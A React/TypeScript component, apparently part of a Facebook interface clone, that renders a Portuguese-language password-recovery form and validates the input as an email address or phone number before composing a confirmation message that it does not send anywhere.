import { useState } from 'react';
import { Description, Button, Title } from './styles';
import { phone as Phone } from 'phone';
import { Input, ContentArea } from '../../style';
import FacebookLogo from '../../components/FacebookLogo';

const isEmail = (email: string) => /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(email);
const isPhone = (phone: string) =>
	/^\+?([0-9]{2})?[-. ]?([0-9]{2})[-. ]?([0-9]{4,5})[-. ]?([0-9]{4})$/i.test(phone);

export default () => {
	const [username, setUsername] = useState('');

	const handleSend = async () => {
		const email = isEmail(username);
		if (!email && !isPhone(username)) {
			alert('Email ou telefone inválido');
			return;
		}
		const message = `Um código de confirmação será enviado ${
			email ? 'por email' : 'por SMS'
		} para ${username}`;
	};

	return (
		<ContentArea>
			<FacebookLogo />
			<Title>Recuperar senha</Title>
			<Description>
				Insira o número de celular ou email associado à sua conta para receber um código de
				confirmação.
			</Description>
			<Input
				type='text'
				placeholder='Número de celular ou email'
				maxLength={255}
				value={username}
				onChange={(e) => setUsername(e.target.value)}
			/>

			<Button type='button' onClick={handleSend}>
				Enviar código de confirmação
			</Button>
		</ContentArea>
	);
};
